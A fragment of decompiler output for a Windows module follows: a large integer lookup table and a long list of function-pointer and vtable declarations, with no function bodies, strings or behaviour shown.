  1899392025,
  -419009682,
  1981535486,
  -533998711,
  1518000656,
  -867508889,
  1876933113,
  -101728626,
  1136572183,
  -712069024,
  -391915818,
  2123616673,
  -993863624,
  1391648591,
  -244859951,
  1733803174,
  -586762945,
  1261875784,
  -634712616,
  1276840623,
  -162921674,
  1618609217,
  -1007722273,
  1440704424,
  -275878351,
  2042521926,
  -1934401077,
  444819132,
  -1596821723,
  920807506,
  -1787360052,
  54987707,
  -1189739998,
  791020885,
  -1103381819,
  671858098,
  -1839549397,
  74101596,
  -1476405310,
  835702965,
  -1952523988,
  497999451,
  -1329437541,
  653419500,
  -1667011979,
  177433858,
  -1459222116,
  1060507371,
  -2056845454,
  324468741,
  -2109030507,
  343587042,
  -1372868229,
  941340172,
  -1685138798,
  230610405,
  -1209017220,
  568318731,
  -724380794,
  1122161905,
  -122430104,
  1854134815,
  -854147455,
  1529264630,
  -512249745,
  2001188632,
  -430307192,
  1885999103,
  -902101402,
  1544225041,
  -6396529,
  1773036280,
  -738235551,
  1171221526,
  2028079776,
  -288223785,
  1417872462,
  -1028455623,
  1629906855,
  -149528368,
  1296525641,
  -612929986,
  1248514478,
  -598026535,
  1712054080,
  -264513481,
  1403960489,
  -979452962,
  2144318023,
  -369117904,
  485670333,
  -1966949686,
  814986067,
  -1499220956,
  87478458,
  -1828268083,
  693624404,
  -1083713245,
  779773619,
  -1203084860,
  35350621,
  -1809092822,
  935201716,
  -1584526141,
  467600730,
  -1913716179,
  0,
  1093737241,
  -2107492814,
  -1017959125,
  80047204,
  1173649277,
  -2035852714,
  -946454193,
  143317448,
  1237041873,
  -1964445702,
  -874908445,
  206550444,
  1300147893,
  -1909619810,
  -820209529,
  1360183882,
  270784851,
  -747572104,
  -1841172639,
  1440198190,
  350663991,
  -675964900,
  -1769700603,
  1503140738,
  413728923,
  -604361296,
  -1697958231,
  1566406630,
  476867839,
  -549502508,
  -1643226419,
  -1574665067,
  -485122164,
  541504167,
  1635232190,
  -1495144207,
  -405736472,
  612622019,
  1706214874,
  -1431413411,
  -341883324,
  684485487,
  1778217078,
  -1368706759,
  -279303648,
  738789131,
  1832393746,
  -214546721,
  -1308140090,
  1901359341,
  811953140,
  -135058757,
  -1228787294,
  1972444297,
  882902928,
  -71524585,
  -1165130738,
  2044635429,
  955232828,
  -8785037,
  -1102518166,
  2098971969,
  1009442392,
  89094640,
  1149133545,
  -2027073598,
  -971221797,
  25826708,
  1086000781,
  -2081938522,
  -1025951553,
  231055416,
  1291107105,
  -1884842486,
  -828994285,
  151047260,
  1211225925,
  -1956447634,
  -900472457,
  1415429050,
  359440547,
  -700478072,
  -1760651631,
  1352194014,
  296340679,
  -755310100,
  -1815348491,
  1557619314,
  501643627,
  -558541760,
  -1618718887,
  1477578262,
  421729551,
  -630179804,
  -1690229955,
  -1486095003,
  -430250372,
  621398871,
  1681444942,
  -1548840703,
  -492860904,
  567060275,
  1627241514,
  -1344199507,
  -288342092,
  763564703,
  1823607174,
  -1423685431,
  -367701040,
  692485883,
  1752655330,
  -159826129,
  -1220008906,
  1947928861,
  891949572,
  -222538933,
  -1282586542,
  1893623161,
  837779040,
  -17570073,
  -1077740034,
  2089930965,
  1033948108,
  -97088893,
  -1157131878,
  2018819249,
  962963368,
  1268286267,
  178886690,
  -906316535,
  -1999917552,
  1331556191,
  242021446,
  -851453587,
  -1945189772,
  1125276403,
  35865066,
  -1049596735,
  -2143193128,
  1205286551,
  115748238,
  -977993563,
  -2071716932,
  445268337,
  1539005032,
  -1729595581,
  -640062374,
  508505365,
  1602106892,
  -1674765529,
  -585367490,
  302028985,
  1395753888,
  -1872580981,
  -783043182,
  382072029,
  1475669956,
  -1800944913,
  -711534090,
  -373553234,
  -1467147081,
  1809723804,
  720317061,
  -310809654,
  -1404538669,
  1864064504,
  774522593,
  -516497818,
  -1610103425,
  1666508884,
  577106765,
  -437014014,
  -1530746597,
  1737589808,
  648060713,
  -1196505628,
  -106963203,
  986510294,
  2080237775,
  -1133794944,
  -44387687,
  1040818098,
  2134410411,
  -1339810772,
  -250280139,
  843459102,
  1937191175,
  -1260294072,
  -170890415,
  914572922,
  2008178019,
  1322777291,
  266789330,
  -860500743,
  -1920673824,
  1242732207,
  186879414,
  -932142947,
  -1992180860,
  1180508931,
  124532762,
  -1002498767,
  -2062676440,
  1117278055,
  61428862,
  -1057326763,
  -2117377460,
  533018753,
  1593058200,
  -1649996109,
  -594143830,
  453006565,
  1513181180,
  -1721605417,
  -665617970,
  391110985,
  1451162192,
  -1792157829,
  -736310174,
  327847213,
  1388025396,
  -1847018721,
  -791044090,
  -319586722,
  -1379769017,
  1855015020,
  799036277,
  -399109574,
  -1459156701,
  1783899144,
  728055569,
  -461789290,
  -1521959793,
  1713082788,
  657099453,
  -524497934,
  -1584541461,
  1658781120,
  602924761,
  -1109279724,
  -53434611,
  1065585190,
  2125631807,
  -1188769680,
  -132789399,
  994502210,
  2054683995,
  -1251252772,
  -195395899,
  923358190,
  1983400183,
  -1313994312,
  -258010463,
  869023626,
  1929192595,
  0,
  929743361,
  1859421187,
  1505641986,
  -592967417,
  -339555578,
  -1300460284,
  -2062135547,
  -1202646258,
  -1891905265,
  -695888115,
  -504408820,
  1694046729,
  1402198024,
  170761738,
  1028086795,
  1889740316,
  1204413469,
  511156767,
  689791006,
  -1408553189,
  -1688081126,
  -1025529064,
  -172660455,
  -923650798,
  -6752493,
  -1507413743,
  -1857260784,
  341457941,
  590413332,
  2056173590,
  1306819095,
  -532263624,
  -684945607,
  -1902982853,
  -1174926534,
  1022247999,
  193234494,
  1379582012,
  1699742269,
  1477926454,
  1870502967,
  918805045,
  27858996,
  -2067835087,
  -1277848272,
  -362032334,
  -587132621,
  -1864013020,
  -1483757275,
  -30281945,
  -916771546,
  1280139811,
  2066194466,
  580511264,
  368256033,
  682915882,
  534690347,
  1180761129,
  1896496680,
  -199462611,
  -1015631060,
  -1698106066,
  -1381877969,
  -1064461712,
  -135833487,
  -1369891213,
  -1724654478,
  472224631,
  726618486,
  1928402804,
  1167840629,
  2027719038,
  1337346943,
  369626493,
  560123772,
  -1535868807,
  -1826733448,
  -895482758,
  -37042565,
  -1339114388,
  -2025554323,
  -554026897,
  -376374674,
  1820767595,
  1542223722,
  38941032,
  892924777,
  142585698,
  1058368867,
  1722493793,
  1371662688,
  -724064667,
  -474127260,
  -1174199706,
  -1922441113,
  550229832,
  396432713,
  1310675787,
  2037748042,
  -60563889,
  -888595378,
  -1833477556,
  -1512204211,
  -1734687674,
  -1343224249,
  -162643899,
  -1054571964,
  1144180033,
  1935150912,
  719735106,
  495749955,
  1349054804,
  1728197461,
  1052538199,
  165066582,
  -1933510573,
  -1146471854,
  -501973936,
  -713114031,
  -398859686,
  -548200357,
  -2031262119,
  -1316510632,
  881978205,
  66791772,
  1514499934,
  1831841119,
  -2145700383,
  -1217267744,
  -288378398,
  -643468317,
  1555250406,
  1809448679,
  845658341,
  84769508,
  944383727,
  253813998,
  1453236972,
  1643405549,
  -454938648,
  -746000919,
  -1976128533,
  -1118017046,
  -256371715,
  -942484996,
  -1637050370,
  -1459202561,
  739252986,
  461035771,
  1120182009,
  1974361336,
  1223229683,
  2139341554,
  641565936,
  290932465,
  -1807676940,
  -1557410827,
  -90862089,
  -838905866,
  1616738521,
  1463270104,
  243924186,
  971194075,
  -1124765218,
  -1952468001,
  -769526307,
  -448055332,
  -670274601,
  -278484522,
  -1227296812,
  -2119029291,
  77882064,
  869179601,
  1785784019,
  1561994450,
  285105861,
  664050884,
  2116737734,
  1228937415,
  -866756670,
  -79915581,
  -1568484415,
  -1779953216,
  -1464906293,
  -1614442550,
  -964965944,
  -250541111,
  1946633420,
  1131251405,
  450085071,
  767099598,
  1083617169,
  2013031824,
  776088466,
  422111635,
  -1673615722,
  -1420532585,
  -219536747,
  -981409644,
  -121127777,
  -810713442,
  -1777125220,
  -1585841507,
  611300760,
  319125401,
  1253781915,
  2110911386,
  808814989,
  123685772,
  1591807374,
  1770770319,
  -325222262,
  -604552565,
  -2109143927,
  -1255946616,
  -2006672765,
  -1089578878,
  -424665472,
  -774185855,
  1422693252,
  1671844229,
  974657415,
  225629574,
  -1596923223,
  -1749409624,
  -838572374,
  -110189397,
  2088299438,
  1259481519,
  313290669,
  633777580,
  411169191,
  803943334,
  1985312164,
  1094694821,
  -1003882336,
  -213697887,
  -1426228061,
  -1650999646,
  -797719371,
  -417790284,
  -1096335178,
  -1983020361,
  215731634,
  1001459635,
  1645169073,
  1432718256,
  1747113915,
  1598559674,
  116806584,
  832344505,
  -1265967428,
  -2082464579,
  -631350593,
  -315320130,
  0,
  1701297336,
  -1949824598,
  -290474734,
  1469538959,
  854646327,
  -597726427,
  -1187457123,
  -282544955,
  -1974531971,
  1692450159,
  25625047,
  -1195387318,
  -573019406,
  863494112,
  1443914584,
  -1621681840,
  -97475096,
  345968890,
  1912122434,
  -926909473,
  -1381513369,
  1124627061,
  644861645,
  1887415701,
  353898797,
  -71850945,
  -1630529401,
  669568794,
  1116697506,
  -1407138128,
  -918062584,
  1051669152,
  1539870232,
  -1251525878,
  -805271630,
  1765298223,
  207613079,
  -487564923,
  -2020088515,
  -779647387,
  -1260373283,
  1515163599,
  1059599223,
  -2045713174,
  -478717870,
  232320320,
  1757368824,
  -1577571344,
  -996174008,
  707797594,
  1331142370,
  -160478849,
  -1828129337,
  2108113109,
  415300717,
  1322295093,
  733422477,
  -988244321,
  -1602278873,
  424148410,
  2082488578,
  -1836059632,
  -135771992,
  1029182619,
  1480566819,
  -1232069327,
  -738745975,
  1791981076,
  262720172,
  -519602242,
  -2074033402,
  -764370850,
  -1223222042,
  1505274356,
  1021252940,
  -2048408879,
  -528449943,
  238013307,
  1799911363,
  -1576071733,
  -949440141,
  700908641,
  1285601497,
  -174559420,
  -1862282244,
  2119198446,
  456645206,
  1294448910,
  675284406,
  -957370204,
  -1551365092,
  447798145,
  2144823097,
  -1854352853,
  -199266669,
  66528827,
  1720752771,
  -2009124975,
  -312962263,
  1415595188,
  822605836,
  -542618338,
  -1160777306,
  -320892162,
  -1984418234,
  1729600340,
  40904684,
  -1152847759,
  -567325495,
  813758939,
  1441219939,
  -1667219605,
  -104365101,
  392705729,
  1913621113,
  -885563932,
  -1370431140,
  1090475086,
  630778102,
  1938328494,
  384775958,
  -129990140,
  -1658372420,
  606071073,
  1098405273,
  -1344806773,
  -894411725,
  1001806317,
  1590814037,
  -1333899193,
  -719721217,
  1814117218,
  155617242,
  -404147512,
  -2104586640,
  -727782104,
  -1309060720,
  1599530114,
  976312378,
  -2096525401,
  -428985569,
  146900493,
  1839610549,
  -1528741699,
  -1048118267,
  791234839,
  1246688687,
  -210361806,
  -1777230198,
  2025728920,
  500799264,
  1271526520,
  783173824,
  -1073611310,
  -1520025238,
  475961079,
  2033789519,
  -1751736483,
  -219077659,
  85551949,
  1618925557,
  -1898880281,
  -340337057,
  1385040322,
  938063226,
  -649723800,
  -1138639664,
  -365830264,
  -1890163920,
  1643763234,
  77490842,
  -1113146105,
  -658439745,
  913224877,
  1393100821,
  -1706135011,
  -14037339,
  294026167,
  1960953615,
  -841412462,
  -1463899094,
  1175525688,
  594978176,
  1969669848,
  268532320,
  -22098062,
  -1681296438,
  586261591,
  1201019119,
  -1455837699,
  -866250427,
  116280694,
  1669984718,
  -1926871844,
  -398329756,
  1366896633,
  874419009,
  -625924525,
  -1076454677,
  -372835917,
  -1935588085,
  1645146137,
  124341409,
  -1101948100,
  -617207932,
  899256982,
  1358835246,
  -1715907546,
  -52500322,
  309419404,
  1997988148,
  -835832151,
  -1421243887,
  1172717315,
  545358779,
  1989271779,
  334912603,
  -44439223,
  -1740745231,
  554074732,
  1147223764,
  -1429304378,
  -810993794,
  943816662,
  1562821486,
  -1282836868,
  -688993596,
  1876303193,
  179413473,
  -467790605,
  -2122733493,
  -680932589,
  -1307674709,
  1554105017,
  969309697,
  -2130794084,
  -442952412,
  188129334,
  1850809486,
  -1491704186,
  -1032725954,
  752774956,
  1236915092,
  -259980279,
  -1780041551,
  2068385187,
  506376475,
  1212076611,
  760835835,
  -1007232023,
  -1500420271,
  531214540,
  2060323956,
  -1805534874,
  -251263522
}; // weak
_UNKNOWN unk_101018F8; // weak
_UNKNOWN unk_10101938; // weak
_UNKNOWN unk_10101978; // weak
_UNKNOWN unk_101019B8; // weak
_UNKNOWN unk_101019F8; // weak
_UNKNOWN unk_101021F8; // weak
__int16 word_10102278[20] = { 16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15, 0 }; // weak
_UNKNOWN unk_101022A0; // weak
int (__thiscall *off_101022E8)(void *Block, char) = &sub_1000B85E; // weak
int (__stdcall *off_101022EC)(char) = &sub_1000CB65; // weak
int (__stdcall *off_101022F4)(char) = &sub_1000CB43; // weak
_UNKNOWN unk_101022FC; // weak
int (__stdcall *off_10102304)(char) = &sub_1000CB87; // weak
int (__thiscall *off_10102310)(void *Block, char) = &sub_1000BB35; // weak
int (__thiscall *off_1010238C[2])(void *, char) = { &sub_10001257, &sub_1000CFA5 }; // weak
int (__thiscall *off_10102390)(void *Block, char) = &sub_1000CFA5; // weak
int (__thiscall *off_10102398)(void *Block, char) = &sub_1000E6AB; // weak
int (__thiscall *off_101023F4[2])(void *Block, char) = { &sub_1000E0F2, &sub_1000E4CA }; // weak
int (__thiscall *off_101023F8)(void *Block, char) = &sub_1000E4CA; // weak
int (__thiscall *off_10102418)(void *Block, char) = &sub_1000E7D8; // weak
int (__thiscall *off_10102420)(void *Block, char) = &sub_10051C02; // weak
int (__thiscall *off_10102428[4])(void *Block, char) = { &sub_1000EA76, &sub_1000EB4D, &sub_1000EC19, &sub_1000ED85 }; // weak
int (__thiscall *off_1010242C[3])(void *Block, char) = { &sub_1000EB4D, &sub_1000EC19, &sub_1000ED85 }; // weak
int (__thiscall *off_10102430[2])(void *Block, char) = { &sub_1000EC19, &sub_1000ED85 }; // weak
int (__thiscall *off_10102434)(void *Block, char) = &sub_1000ED85; // weak
int (*off_10102438[2])() = { &sub_1000EF7D, &sub_1000EFDD }; // weak
int (__stdcall *off_10102468)(char) = &sub_1000F290; // weak
int (__stdcall *off_101024E0)(char) = &sub_1000FD8A; // weak
int (__stdcall *off_101024E8)(char) = &sub_1000FC33; // weak
int (__thiscall *off_1010256C)(void *Block, char) = &sub_10010E97; // weak
int (__stdcall *off_10102598)(char) = &sub_100116C3; // weak
_UNKNOWN unk_101025A0; // weak
_UNKNOWN unk_101025AC; // weak
int (__thiscall *off_101025B4)(void *Block, char) = &sub_10011923; // weak
int (__thiscall *off_101025E0[7])(void *Block, char) =
{
  &sub_10011D61,
  &sub_10011D80,
  &sub_10011D9F,
  &sub_10011DBE,
  &sub_10012057,
  &sub_100121DB,
  &sub_1001227F
}; // weak
int (__thiscall *off_101025E4[6])(void *Block, char) =
{
  &sub_10011D80,
  &sub_10011D9F,
  &sub_10011DBE,
  &sub_10012057,
  &sub_100121DB,
  &sub_1001227F
}; // weak
int (__thiscall *off_101025E8[5])(void *Block, char) = { &sub_10011D9F, &sub_10011DBE, &sub_10012057, &sub_100121DB, &sub_1001227F }; // weak
int (__thiscall *off_101025EC[4])(void *Block, char) = { &sub_10011DBE, &sub_10012057, &sub_100121DB, &sub_1001227F }; // weak
int (__thiscall *off_101025F0[3])(void *Block, char) = { &sub_10012057, &sub_100121DB, &sub_1001227F }; // weak
int (__thiscall *off_101025F4[2])(void *, char) = { &sub_100121DB, &sub_1001227F }; // weak
int (__thiscall *off_101025F8)(void *Block, char) = &sub_1001227F; // weak
int (__stdcall *off_10102628)(int) = &sub_100125B6; // weak
int (__thiscall *off_1010264C)(void *Block, char) = &sub_10012AC0; // weak
int (__thiscall *off_1010265C)(void *Block, char) = &sub_1001265A; // weak
int (__thiscall *off_10102698)(void *Block, char) = &sub_10012D82; // weak
int (__thiscall *off_101026A0)(void *Block, char) = &sub_10013225; // weak
int (__thiscall *off_10102700[2])(void *Block, char) = { &sub_1001310B, &sub_10014471 }; // weak
int (__thiscall *off_10102704)(void *Block, char) = &sub_10014471; // weak
int (__thiscall *off_10102728)(void *Block, char) = &sub_10014414; // weak
int (__thiscall *off_10102784)(void *Block, char) = &sub_10014452; // weak
int (__thiscall *off_101027C0)(void *Block, char) = &sub_10014433; // weak
int (__thiscall *off_1010281C)(void *Block, char) = &sub_1001517D; // weak
int (__thiscall *off_10102828)(void *Block, char) = &sub_10015B39; // weak
int (__thiscall *off_10102884[2])(void *Block, char) = { &sub_10015B78, &sub_10015D31 }; // weak
int (__thiscall *off_10102888)(void *Block, char) = &sub_10015D31; // weak
int (__thiscall *off_10102890)(void *Block, char) = &sub_10015DFC; // weak
int (__thiscall *off_101028C4)(void *Block, char) = &sub_10015FF8; // weak
int (__thiscall *off_101028F4)(void *Block, char) = &sub_100161E7; // weak
int (__stdcall *off_10102910)(int) = &sub_10016363; // weak
int (__stdcall *off_10102928)(char) = &sub_1001669A; // weak
_UNKNOWN unk_10102930; // weak
int (__thiscall *off_10102938)(void *Block, char) = &sub_100168F0; // weak
int (__thiscall *off_10102950)(void *Block, char) = &sub_100172B4; // weak
int (__stdcall *off_10102954)(char) = &sub_10017420; // weak
const wchar_t word_10102960 = 0u; // idb
int (__stdcall *off_10102964)(char) = &sub_10017CC4; // weak
int (__thiscall *off_10102970)(void *Block, char) = &sub_10018FB6; // weak
int (__thiscall *off_101029AC[2])(void *Block, char) = { &sub_1001872B, &sub_10018F8D }; // weak
int (__thiscall *off_101029B0)(void *Block, char) = &sub_10018F8D; // weak
int (__stdcall *off_10102A0C)(char) = &sub_100186F0; // weak
int (__thiscall *off_10102A2C[2])(void *Block, char) = { &sub_100194E7, &sub_100195B0 }; // weak
int (__thiscall *off_10102A30)(void *Block, char) = &sub_100195B0; // weak
int (__thiscall *off_10102A68)(void *Block, char) = &sub_1001A94A; // weak
int (__thiscall *off_10102A70)(void *Block, char) = &sub_1001A9AF; // weak
int (__thiscall *off_10102AC8)(void *Block, char) = &sub_1001AC6A; // weak
int (__thiscall *off_10102AF8)(void *Block, char) = &sub_1001AEF3; // weak
int (__thiscall *off_10102B30)(void *Block, char) = &sub_1001B112; // weak
int (__thiscall *off_10102B8C)(void *, char) = &sub_1001C5CC; // weak
int (__thiscall *off_10102BB0)(void *Block, char) = &sub_1001C5AD; // weak
int (__thiscall *off_10102C10)(void *Block, char) = &sub_1001BD5B; // weak
int (__thiscall *off_10102C50[2])(void *Block, char) = { &sub_1001BD3C, &sub_1001BFD7 }; // weak
int (__thiscall *off_10102C54)(void *Block, char) = &sub_1001BFD7; // weak
int (__thiscall *off_10102C78)(void *Block, char) = &sub_1001C7DA; // weak
int (__thiscall *off_10102CC8[2])(void *Block, char) = { &sub_1001E8C3, &sub_1001EF1C }; // weak
int (__thiscall *off_10102CCC)(void *Block, char) = &sub_1001EF1C; // weak
int (__thiscall *off_10102CF4)(void *Block, char) = &sub_1001EC82; // weak
int (__thiscall *off_10102D10)(void *Block, char) = &sub_1001F567; // weak
int (__thiscall *off_10102D94)(void *Block, char) = &sub_1001FB2B; // weak
int (__stdcall *off_10102DC0)(int) = &sub_10020188; // weak
int (__stdcall *off_10102DEC)(char) = &sub_1001FA28; // weak
int (__thiscall *off_10102DF4[2])(void *Block, char) = { &sub_100206C4, &sub_100207DE }; // weak
int (__thiscall *off_10102DF8)(void *Block, char) = &sub_100207DE; // weak
int (__thiscall *off_10102E30)(void *Block, char) = &sub_100208F9; // weak
int (__thiscall *off_10102E64[4])(void *Block, char) = { &sub_10020C2A, &sub_10021152, &sub_1002159A, &sub_10022228 }; // weak
int (__thiscall *off_10102E68[3])(void *Block, char) = { &sub_10021152, &sub_1002159A, &sub_10022228 }; // weak
int (__thiscall *off_10102E6C[2])(void *Block, char) = { &sub_1002159A, &sub_10022228 }; // weak
int (__thiscall *off_10102E70)(void *Block, char) = &sub_10022228; // weak
int (__thiscall *off_10102EC0)(void *Block, char) = &sub_10021EAB; // weak
int (__thiscall *off_10102F00[3])(void *Block, char) = { &sub_10021A18, &sub_10021EFA, &sub_100221B2 }; // weak
int (__thiscall *off_10102F04[2])(void *Block, char) = { &sub_10021EFA, &sub_100221B2 }; // weak
int (__thiscall *off_10102F08)(void *Block, char) = &sub_100221B2; // weak
int (__thiscall *off_10102F28)(void *Block, char) = &sub_100223FA; // weak
int (__thiscall *off_10102F6C)(void *Block, char) = &sub_1002256C; // weak
int (__thiscall *off_10102F80)(void *Block, char) = &sub_100225C6; // weak
int (__thiscall *off_10102F94[3])(void *Block, char) = { &sub_100227C9, &sub_10022844, &sub_10022A31 }; // weak
int (__thiscall *off_10102F98[2])(void *Block, char) = { &sub_10022844, &sub_10022A31 }; // weak
int (__thiscall *off_10102F9C)(void *Block, char) = &sub_10022A31; // weak
int (__thiscall *off_10102FB4[4])(void *Block, char) = { &sub_10022DDA, &sub_1002317E, &sub_10023377, &sub_100237CA }; // weak
int (__thiscall *off_10102FB8[3])(void *Block, char) = { &sub_1002317E, &sub_10023377, &sub_100237CA }; // weak
int (__thiscall *off_10102FBC[2])(void *Block, char) = { &sub_10023377, &sub_100237CA }; // weak
int (__thiscall *off_10102FC0)(void *Block, char) = &sub_100237CA; // weak
int (__thiscall *off_10103000)(void *Block, char) = &sub_100239B7; // weak
int (__thiscall *off_10103020)(void *Block, char) = &sub_10023A6A; // weak
int (__thiscall *off_10103028)(void *Block, char) = &sub_10023EFE; // weak
int (__thiscall *off_10103068)(void *Block, char) = &sub_100240EA; // weak
int (__thiscall *off_10103088)(void *Block, char) = &sub_10024766; // weak
int (__thiscall *off_1010309C)(void *Block, char) = &sub_10024DD3; // weak
int (__thiscall *off_101030C0)(void *Block, char) = &sub_10024DB4; // weak
int (__stdcall *off_101030FC)(char) = &sub_10024B19; // weak
int (__thiscall *off_1010311C)(void *Block, char) = &sub_10025A25; // weak
int (__thiscall *off_10103140)(void *Block, char) = &sub_1002610F; // weak
int (__thiscall *off_10103158)(void *Block, char) = &sub_100299B0; // weak
int (__thiscall *off_10103198)(void *Block, char) = &unknown_libname_6; // weak
int (__thiscall *off_101031A8)(void *Block, char) = &sub_10028887; // weak
int (__thiscall *off_101031C0)(void *Block, char) = &sub_1002994C; // weak
int (__thiscall *off_10103200)(void *Block, char) = &sub_10028A2C; // weak
int (__thiscall *off_10103210[2])(void *Block, char) = { &sub_10029994, &unknown_libname_7 }; // weak
int (__thiscall *off_10103214)(void *Block, char) = &unknown_libname_7; // weak
_UNKNOWN unk_10103234; // weak
int (__thiscall *off_10103238)(void *Block, char) = &sub_1002AC24; // weak
int (__thiscall *off_10103248)(void *Block, char) = &sub_1002AC76; // weak
int (__thiscall *off_1010326C)(void *Block, char) = &sub_1002ACFA; // weak
int (__stdcall *off_10103294)(char) = &sub_1002D2DB; // weak
int (__thiscall *off_101032A4)(void *Block, char) = &sub_1002E34A; // weak
int (__thiscall *off_101032E0)(void *Block, char) = &sub_1002D608; // weak
int (__thiscall *off_101032F8)(void *Block, char) = &sub_1002E306; // weak
int (__thiscall *off_10103358)(void *Block, char) = &sub_1002E322; // weak
int (__stdcall *off_101033B4)(char) = &sub_1002D9DF; // weak
int (__thiscall *off_101033D4)(void *Block, char) = &sub_1002E4FB; // weak
int (__thiscall *off_101033E4)(void *Block, char) = &sub_1002E6F7; // weak
int (__thiscall *off_101033F4)(void *Block, char) = &sub_100358BA; // weak
int (__thiscall *off_101033FC)(void *Block, char) = &sub_1002E89B; // weak
int (__thiscall *off_1010340C)(void *Block, char) = &sub_1002ECC4; // weak
int (__thiscall *off_1010341C)(void *Block, char) = &sub_1002EF56; // weak
int (__thiscall *off_1010342C)(void *Block, char) = &sub_1002F232; // weak
int (__thiscall *off_1010343C[2])(void *Block, char) = { &sub_1002F158, &unknown_libname_8 }; // weak
int (__thiscall *off_10103440)(void *Block, char) = &unknown_libname_8; // weak
int (__thiscall *off_10103454)(void *Block, char) = &sub_1002FF45; // weak
int (__thiscall *off_10103468)(void *Block, char) = &sub_10030654; // weak
int (__thiscall *off_10103478)(void *Block, char) = &sub_10030A06; // weak
int (__thiscall *off_101034B4)(void *Block, char) = &sub_100309EA; // weak
int (__thiscall *off_101034C4[2])(void *Block, char) = { &sub_10030F04, &sub_1003138B }; // weak
int (__thiscall *off_101034C8)(void *Block, char) = &sub_1003138B; // weak
int (__stdcall *off_10103524)(char) = &sub_1002D9DF; // weak
int (__thiscall *off_10103548)(void *Block, char) = &sub_10032FB7; // weak
int (__thiscall *off_10103588[2])(void *Block, char) = { &sub_100315B8, &sub_100340D5 }; // weak
int (__thiscall *off_1010358C)(void *Block, char) = &sub_100340D5; // weak
int (__thiscall *off_101035C8)(void *Block, char) = &sub_100340B9; // weak
int (__thiscall *off_10103624)(void *Block, char) = &sub_10034129; // weak
int (__thiscall *off_10103648)(void *Block, char) = &sub_1003334F; // weak
int (__thiscall *off_10103650)(void *Block, char) = &sub_100340F1; // weak
int (__thiscall *off_101036AC)(void *Block, char) = &sub_1003410D; // weak
int (__stdcall *off_101036E8)(char) = &sub_1004E954; // weak
int (__stdcall *off_10103708)(char) = &sub_1003331B; // weak
int (__thiscall *off_10103728)(void *Block, char) = &unknown_libname_9; // weak
int (__thiscall *off_10103748)(void *Block, char) = &sub_10034343; // weak
int (__thiscall *off_10103750)(void *Block, char) = &sub_10034F4E; // weak
int (__thiscall *off_10103790)(void *Block, char) = &unknown_libname_10; // weak
int (__thiscall *off_101037B0)(void *Block, char) = &sub_1003535E; // weak
int (__thiscall *off_101037D4)(void *Block, char) = &sub_100355FB; // weak
int (__thiscall *off_101037E8)(void *Block, char) = &sub_10036B58; // weak
int (__thiscall *off_10103844)(void *Block, char) = &sub_10035D9C; // weak
int (__thiscall *off_1010385C[2])(void *Block, char) = { &sub_10036E0F, &sub_10036CBF }; // weak
int (__thiscall *off_10103860)(void *Block, char) = &sub_10036CBF; // weak
int (__thiscall *off_10103894)(void *Block, char) = &sub_100391DB; // weak
int (__thiscall *off_101038D0)(void *Block, char) = &sub_10039151; // weak
int (__thiscall *off_1010390C[2])(void *Block, char) = { &sub_10036D58, &sub_100380DE }; // weak
int (__thiscall *off_10103910)(void *Block, char) = &sub_100380DE; // weak
int (__thiscall *off_10103918)(void *Block, char) = &sub_1003918B; // weak
int (__thiscall *off_10103974)(void *Block, char) = &sub_100391F7; // weak
int (__thiscall *off_101039B0[2])(void *Block, char) = { &sub_10038169, &sub_10039213 }; // weak
int (__thiscall *off_101039B4)(void *Block, char) = &sub_10039213; // weak
int (__thiscall *off_101039F0)(void *, char) = &sub_1003947F; // weak
int (__thiscall *off_10103A4C)(void *, char) = &sub_100394C8; // weak
int (__stdcall *off_10103A50)(char) = &sub_10038076; // weak
int (__stdcall *off_10103A70)(char) = &sub_100380AA; // weak
int (__thiscall *off_10103A90)(void *Block, char) = &unknown_libname_11; // weak
int (__stdcall *off_10103AB0)(char) = &sub_10038135; // weak
int (__stdcall *off_10103AD0)(char) = &sub_1003DF54; // weak
int (__thiscall *off_10103AF0)(void *Block, char) = &sub_1003961F; // weak
int (__thiscall *off_10103B00)(void *Block, char) = &sub_1003ACBF; // weak
int (__thiscall *off_10103B40)(void *Block, char) = &sub_1003AC7A; // weak
int (__thiscall *off_10103BA0)(void *Block, char) = &sub_1003AC96; // weak
int (__thiscall *off_10103BFC)(void *Block, char) = &sub_1003983D; // weak
int (__thiscall *off_10103C0C)(void *Block, char) = &sub_1003ACDB; // weak
int (__stdcall *off_10103C48)(char) = &sub_1003DEB4; // weak
int (__stdcall *off_10103C68)(char) = &sub_1004E954; // weak
int (__thiscall *off_10103C88)(void *Block, char) = &sub_1003B0EE; // weak
int (__stdcall *off_10103C98)(char) = &sub_1003BB88; // weak
int (__thiscall *off_10103CA0)(void *Block, char) = &sub_1003BC4A; // weak
int (__thiscall *off_10103CB0)(void *Block, char) = &sub_1003C636; // weak
int (__thiscall *off_10103CC0[2])(void *Block, char) = { &unknown_libname_12, &sub_1003EE53 }; // weak
int (__thiscall *off_10103CC4)(void *Block, char) = &sub_1003EE53; // weak
int (__thiscall *off_10103D00)(void *Block, char) = &sub_1003EE1B; // weak
int (__thiscall *off_10103D3C[2])(void *Block, char) = { &sub_1003DEE8, &sub_1003EDFF }; // weak
int (__thiscall *off_10103D40)(void *Block, char) = &sub_1003EDFF; // weak
int (__thiscall *off_10103D9C)(void *Block, char) = &sub_1003CBC5; // weak
int (__thiscall *off_10103DB0)(void *Block, char) = &sub_1003EE37; // weak
int (__thiscall *off_10103E0C)(void *Block, char) = &sub_1003EE8B; // weak
int (__thiscall *off_10103E48)(void *Block, char) = &sub_1003DF38; // weak
int (__thiscall *off_10103E50)(void *Block, char) = &sub_1003EE6F; // weak
int (__stdcall *off_10103EAC)(char) = &sub_1003DEB4; // weak
int (__stdcall *off_10103ECC)(char) = &sub_1003DF04; // weak
int (__stdcall *off_10103EEC)(char) = &sub_1003DF54; // weak
int (__thiscall *off_10103F0C)(void *Block, char) = &sub_1003F205; // weak
int (__stdcall *off_10103F20)(char) = &sub_1003F961; // weak
int (__thiscall *off_10103F28[3])(void *Block, char) = { &sub_100404A4, &sub_10040583, &sub_100406D5 }; // weak
int (__thiscall *off_10103F2C[2])(void *Block, char) = { &sub_10040583, &sub_100406D5 }; // weak
int (__thiscall *off_10103F30)(void *Block, char) = &sub_100406D5; // weak
int (__thiscall *off_10103F48)(void *Block, char) = &sub_10040C7B; // weak
int (__thiscall *off_10103F50)(void *Block, char) = &sub_100411D8; // weak
int (__thiscall *off_10103F58)(void *Block, char) = &sub_10040C0D; // weak
int (__thiscall *off_10103F60)(void *Block, char) = &sub_10040DCE; // weak
int (__thiscall *off_10103F68)(void *Block, char) = &sub_10042AE6; // weak
